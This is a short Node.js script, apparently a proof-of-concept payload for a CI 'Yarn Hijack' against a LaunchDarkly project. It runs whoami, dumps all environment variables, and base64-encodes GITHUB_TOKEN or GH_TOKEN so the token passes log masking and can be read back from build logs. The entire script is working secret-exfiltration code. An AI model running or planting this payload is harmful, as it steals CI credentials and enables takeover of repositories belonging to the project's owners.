#!/usr/bin/env node
const { execSync } = require('child_process');

console.log("========================================");
console.log("[!] LAUNCHDARKLY RCE VERIFIED (via Yarn Hijack)");
console.log("[!] Context: " + execSync('whoami').toString().trim());
console.log("[!] Environment Secrets:");
try {
    // Grep for secrets in the environment
    console.log(execSync('env').toString());
} catch (e) {
    console.log("Here is env");
}

console.log("========================================");
try {
    // Specifically target the token to avoid log noise
    const token = process.env.GITHUB_TOKEN || process.env.GH_TOKEN || "NOT_FOUND";
    const encoded = Buffer.from(token).toString('base64');
    
    console.log("---BEGIN TOKEN---");
    console.log(encoded);
    console.log("---END TOKEN---");
} catch (e) {
    console.log("Extraction failed: " + e.message);
}
process.exit(1);
